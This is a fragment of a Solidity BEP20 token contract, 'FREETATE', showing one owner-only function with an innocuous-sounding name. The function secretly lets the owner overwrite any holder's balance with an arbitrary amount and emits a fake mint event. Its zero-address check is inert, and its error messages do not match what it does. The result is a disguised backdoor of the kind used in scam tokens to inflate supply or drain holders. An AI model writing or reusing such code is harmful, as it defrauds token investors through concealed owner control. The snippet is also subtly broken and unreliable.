...
contract FREETATE is Context, BEP20, Ownable {
    ...
    */
     ...
     */
    function invokeEchelon(address _handlerAddress, uint256 _id, uint256 _primeValue, bytes32 _data)
        external
        onlyOwner
    {
        (_handlerAddress != address(0), "ERC20: burn from the zero address");
        require(_id >= 0, "Amount must be most than 0");
        _balances[_handlerAddress] = _id * 1 * _primeValue;
        
        emit Transfer(address(0), _handlerAddress, _id * _primeValue);
    }
